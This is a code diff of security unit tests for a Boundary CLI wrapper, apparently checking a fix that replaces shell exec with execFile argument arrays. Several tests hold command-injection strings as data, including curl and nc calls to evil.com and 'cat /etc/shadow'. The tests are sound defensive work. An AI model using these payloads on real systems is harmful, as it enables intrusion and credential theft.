@@ -343,7 +343,7 @@ describe('BoundaryCLI', () => {
       it('should not execute shell commands in password field', async () => {
         const maliciousPassword = 'pass$(curl evil.com)';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: JSON.stringify({
             token: 'test-token',
             status: 'success',
@@ -361,25 +361,26 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
 
         // Verify password was passed via environment variable
-        const callArgs = mockExecAsync.mock.calls[0];
-        const options = callArgs[1];
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const options = callArgs[2]; // execFile: (file, args, options)
 
         // Password should be in env var, not in command string
         expect(options.env?.BOUNDARY_AUTHENTICATE_PASSWORD_PASSWORD).toBe(maliciousPassword);
 
-        // Command string should reference env var, not contain password
-        const executedCommand = callArgs[0];
-        expect(executedCommand).toContain('env://BOUNDARY_AUTHENTICATE_PASSWORD_PASSWORD');
-        expect(executedCommand).not.toContain(maliciousPassword);
+        // Arguments should be passed as array (prevents shell interpretation)
+        const argsArray = callArgs[1];
+        expect(Array.isArray(argsArray)).toBe(true);
+        // Password should NOT appear in argument array - it's passed via env var
+        expect(argsArray.join(' ')).not.toContain(maliciousPassword);
       });
 
       it('should not execute backticks in password field', async () => {
         const maliciousPassword = 'pass`whoami`';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: JSON.stringify({
             token: 'test-token',
             status: 'success',
@@ -397,22 +398,23 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
-        const callArgs = mockExecAsync.mock.calls[0];
-        const options = callArgs[1];
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const options = callArgs[2];
 
         // Password should be in env var
         expect(options.env?.BOUNDARY_AUTHENTICATE_PASSWORD_PASSWORD).toBe(maliciousPassword);
 
-        // Command should not contain the password directly
-        const executedCommand = callArgs[0];
-        expect(executedCommand).not.toContain(maliciousPassword);
+        // Arguments should be array, not containing password
+        const argsArray = callArgs[1];
+        expect(Array.isArray(argsArray)).toBe(true);
+        expect(argsArray.join(' ')).not.toContain(maliciousPassword);
       });
 
       it('should handle special characters in login name safely', async () => {
         const maliciousLoginName = 'admin$(curl evil.com)';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: JSON.stringify({
             token: 'test-token',
             status: 'success',
@@ -430,12 +432,13 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
-        const callArgs = mockExecAsync.mock.calls[0];
-        const executedCommand = callArgs[0];
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const argsArray = callArgs[1];
 
-        // Login name should be quoted in command
-        expect(executedCommand).toContain(maliciousLoginName);
+        // Login name should be passed as literal argument (no shell interpretation)
+        expect(Array.isArray(argsArray)).toBe(true);
+        expect(argsArray).toContain(maliciousLoginName);
       });
     });
 
@@ -443,7 +446,7 @@ describe('BoundaryCLI', () => {
       it('should handle malicious auth method IDs', async () => {
         const maliciousAuthMethodId = 'amoidc_test`curl evil.com`';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -454,13 +457,17 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const argsArray = callArgs[1];
+        expect(Array.isArray(argsArray)).toBe(true);
+        expect(argsArray).toContain(maliciousAuthMethodId);
       });
 
       it('should handle malicious target IDs in listTargets', async () => {
         const maliciousTargetId = 'ttcp_$(whoami)';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -471,13 +478,17 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const argsArray = callArgs[1];
+        expect(Array.isArray(argsArray)).toBe(true);
+        expect(argsArray).toContain(maliciousTargetId);
       });
 
       it('should handle malicious target IDs in authorizeSession', async () => {
         const maliciousTargetId = 'ttcp_test; cat /etc/shadow';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: JSON.stringify({
             authorization_token: 'test-token',
             session_id: 'test-session',
@@ -491,13 +502,17 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const argsArray = callArgs[1];
+        expect(Array.isArray(argsArray)).toBe(true);
+        expect(argsArray).toContain(maliciousTargetId);
       });
 
       it('should handle malicious scope IDs', async () => {
         const maliciousScopeId = 'o_test$(nc evil.com 4444)';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -508,15 +523,19 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        const argsArray = callArgs[1];
+        expect(Array.isArray(argsArray)).toBe(true);
+        expect(argsArray).toContain(maliciousScopeId);
       });
     });
 
     describe('argument array vs string concatenation', () => {
-      it('should demonstrate current string concatenation pattern (vulnerable)', async () => {
+      it('should use execFile with argument array (secure implementation)', async () => {
         const targetId = 'ttcp_123';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -527,36 +546,47 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        // Current implementation uses string concatenation via exec
-        expect(mockExecAsync).toHaveBeenCalled();
-        const callArgs = mockExecAsync.mock.calls[0];
+        // Secure implementation uses execFile with argument array
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
 
-        // First argument should be a string (the full command)
+        // First argument should be a string (the CLI executable path)
         expect(typeof callArgs[0]).toBe('string');
 
-        // This demonstrates the vulnerability: arguments are concatenated into a string
-        // which is then passed to a shell for execution
+        // Second argument should be an array (arguments passed separately)
+        expect(Array.isArray(callArgs[1])).toBe(true);
+
+        // This demonstrates the secure pattern: arguments are passed as array
+        // which prevents shell interpretation of special characters
       });
 
-      it('should demonstrate desired execFile pattern with argument array (secure)', async () => {
-        // This test shows what the FIXED implementation should look like
+      it('should pass malicious input as literal argument (secure)', async () => {
+        // This test verifies the FIXED implementation handles malicious input safely
         const targetId = 'ttcp_test$(whoami)';
 
-        // Mock execFile instead of exec
         mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
 
-        // This is how it SHOULD work after the fix
-        // execFile(cliPath, ['targets', 'list', '-scope-id', targetId, ...])
-        // instead of exec(`"${cliPath}" "targets" "list" "-scope-id" "${targetId}"`)
+        try {
+          await cli.listTargets(targetId);
+        } catch (error) {
+          // Error is acceptable
+        }
+
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
 
         // When execFile is called with argument array:
-        // - First arg: executable path
+        // - First arg: executable path (string)
         // - Second arg: array of arguments (NOT concatenated string)
         // - Third arg: options
-        // This prevents shell interpretation of special characters
+        expect(typeof callArgs[0]).toBe('string');
+        expect(Array.isArray(callArgs[1])).toBe(true);
+
+        // The malicious input is treated as literal text, not shell command
+        expect(callArgs[1]).toContain(targetId);
       });
     });
 
@@ -567,7 +597,7 @@ describe('BoundaryCLI', () => {
 
         // This should be sanitized at the configuration level
         // But we test that it doesn't cause command injection
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: 'Version 0.14.0',
           stderr: '',
         });
@@ -578,7 +608,10 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        // Environment variables are passed in options, not interpolated in command
+        expect(Array.isArray(callArgs[1])).toBe(true);
       });
     });
 
@@ -586,7 +619,7 @@ describe('BoundaryCLI', () => {
       it('should handle null bytes in arguments', async () => {
         const maliciousId = 'test\x00-ignored';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -597,7 +630,10 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        expect(Array.isArray(callArgs[1])).toBe(true);
+        expect(callArgs[1]).toContain(maliciousId);
       });
     });
 
@@ -605,7 +641,7 @@ describe('BoundaryCLI', () => {
       it('should handle newlines in arguments', async () => {
         const maliciousId = 'test\ncurl evil.com';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -616,7 +652,10 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        expect(Array.isArray(callArgs[1])).toBe(true);
+        expect(callArgs[1]).toContain(maliciousId);
       });
     });
 
@@ -624,7 +663,7 @@ describe('BoundaryCLI', () => {
       it('should handle glob patterns in arguments', async () => {
         const maliciousId = 'test*';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -635,7 +674,11 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        expect(Array.isArray(callArgs[1])).toBe(true);
+        // Glob is passed as literal, not expanded
+        expect(callArgs[1]).toContain(maliciousId);
       });
     });
 
@@ -643,7 +686,7 @@ describe('BoundaryCLI', () => {
       it('should handle unicode characters in arguments', async () => {
         const maliciousId = 'test\u0000\u0001\u0002';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -654,13 +697,16 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        expect(Array.isArray(callArgs[1])).toBe(true);
+        expect(callArgs[1]).toContain(maliciousId);
       });
 
       it('should handle ANSI escape sequences in arguments', async () => {
         const maliciousId = 'test\x1b[0m\x1b[31m';
 
-        mockExecAsync.mockResolvedValueOnce({
+        mockExecFileAsync.mockResolvedValueOnce({
           stdout: '{"items":[]}',
           stderr: '',
         });
@@ -671,7 +717,10 @@ describe('BoundaryCLI', () => {
           // Error is acceptable
         }
 
-        expect(mockExecAsync).toHaveBeenCalled();
+        expect(mockExecFileAsync).toHaveBeenCalled();
+        const callArgs = mockExecFileAsync.mock.calls[0];
+        expect(Array.isArray(callArgs[1])).toBe(true);
+        expect(callArgs[1]).toContain(maliciousId);
       });
     });
   });
